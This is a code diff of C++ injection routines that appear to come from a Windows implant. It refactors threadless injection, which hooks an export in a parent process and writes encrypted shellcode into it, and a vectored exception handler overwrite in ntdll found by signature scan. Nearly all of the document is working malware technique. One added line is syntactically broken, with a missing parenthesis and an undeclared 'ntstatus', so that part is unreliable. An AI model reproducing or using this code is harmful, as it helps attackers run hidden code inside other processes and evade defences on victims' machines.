@@ -2,6 +2,13 @@
 #define CALL_X_OFFSET 0x1
 #define EXPORT_OFFSET 0x12
 
+using namespace Xtea;
+using namespace Process;
+using namespace Memory::Modules;
+using namespace Memory::Methods;
+using namespace Utils::Scanners;
+using namespace Utils;
+
 namespace Injection {
 
     VOID Threadless(const _threadless &writer, void *const shellcode, size_t n_shellcode, size_t total) {
@@ -14,9 +21,9 @@ namespace Injection {
         UINT_PTR hook       = 0;
         SIZE_T write        = 0;
 
-        x_assert(ex_addr    = Memory::Modules::LoadExport(writer.module, writer.exp));
-        x_assert(process    = Process::OpenParentProcess(writer.parent));
-        x_assert(hook       = Utils::Scanners::RelocateExport(process, C_PTR(ex_addr), n_shellcode));
+        x_assert(ex_addr    = LoadExport(writer.module, writer.exp));
+        x_assert(process    = OpenParentProcess(writer.parent));
+        x_assert(hook       = RelocateExport(process, C_PTR(ex_addr), n_shellcode));
 
         hook_p      = hook;
         loader_rva  = hook - (ex_addr + 5);
@@ -34,7 +41,7 @@ namespace Injection {
         x_assert(write != writer.loader->length);
 
         if (ENCRYPTED) {
-            Xtea::XteaCrypt(B_PTR(shellcode), n_shellcode, Ctx->config.session_key, FALSE);
+            XteaCrypt(B_PTR(shellcode), n_shellcode, Ctx->config.session_key, FALSE);
         }
 
         x_ntassert(Ctx->nt.NtWriteVirtualMemory(process, RVA(PBYTE, hook, writer.loader->length), shellcode, n_shellcode, &write));
@@ -51,13 +58,13 @@ namespace Injection {
 
     namespace Veh {
 
-        UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, char *const signature, char *const mask) {
+        UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *const signature, const char *const mask) {
 
             LdrpVectorHandlerList *handlers = { };
             uintptr_t handler   = { };
             uint32_t match      = 0;
 
-            x_assert(match = Utils::Scanners::SignatureScan(NtCurrentProcess(), (uintptr_t) module->DllBase, module->SizeOfImage, signature, mask));
+            x_assert(match = SignatureScan(NtCurrentProcess(), (uintptr_t) module->DllBase, module->SizeOfImage, signature, mask));
 
             match   += 0xD;
             handlers = (LdrpVectorHandlerList*) *(int32_t*) match + (match + 0x3) + 0x7;
@@ -70,7 +77,7 @@ namespace Injection {
 
         UINT_PTR PointerEncodeDecode(uintptr_t const &pointer, const bool encode) {
 
-            const auto cookie   = Memory::Methods::GetStackCookie();
+            const auto cookie   = GetStackCookie();
             uintptr_t encoded   = 0;
 
             x_assert(cookie);
@@ -82,19 +89,23 @@ namespace Injection {
             return encoded;
         }
 
-        NTSTATUS OverwriteFirstHandler(_veh_writer const &writer) {
+        BOOL OverwriteFirstHandler(_veh_writer const &writer) {
 
-            const auto mod_hash = Utils::HashStringW(writer.mod_name, WcsLength(writer.mod_name));
-            const auto ntdll    = Memory::Modules::GetModuleEntry(mod_hash);
+            const auto mod_hash = HashStringW(writer.mod_name, WcsLength(writer.mod_name));
+            const auto ntdll    = GetModuleEntry(mod_hash);
 
             const auto entry    = GetFirstHandler(ntdll, writer.signature, writer.mask);
             const auto handler  = PointerEncodeDecode(entry, false) + 0x20;
 
             if (!entry) {
-                return FALSE;
+                return false;
             }
 
-            return Ctx->nt.NtWriteVirtualMemory(NtCurrentProcess(), C_PTR(handler), writer.target, sizeof(uintptr_t), nullptr);
+            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtWriteVirtualMemory(NtCurrentProcess(), C_PTR(handler), writer.target, sizeof(uintptr_t), nullptr)) {
+                return false;
+            }
+
+            return true;
         }
     }
 }
